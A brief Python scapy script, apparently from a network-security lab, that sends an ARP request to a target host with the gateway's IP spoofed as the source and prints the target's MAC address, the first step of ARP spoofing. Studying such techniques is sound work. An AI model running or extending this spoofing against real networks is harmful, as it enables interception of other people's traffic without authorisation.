#!/usr/bin/python3

from scapy.all import srp, Ether, ARP
import os
import sys

# GATEWAY
gateway = "10.0.2.1"

# TARGET 
target = "10.0.2.5"

# GET NETWORK ADDRESS
net_addr = "10.0.2.0/24"

# INTERFACE
iface = "eth0"

# SEND ARP: dst=broadcast, pdst = packet dest = target, psrc = packet source ip we want to spoof = gateway
ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=target, psrc=gateway), timeout=3, verbose=1)
if ans:
    print(ans[0][1].src)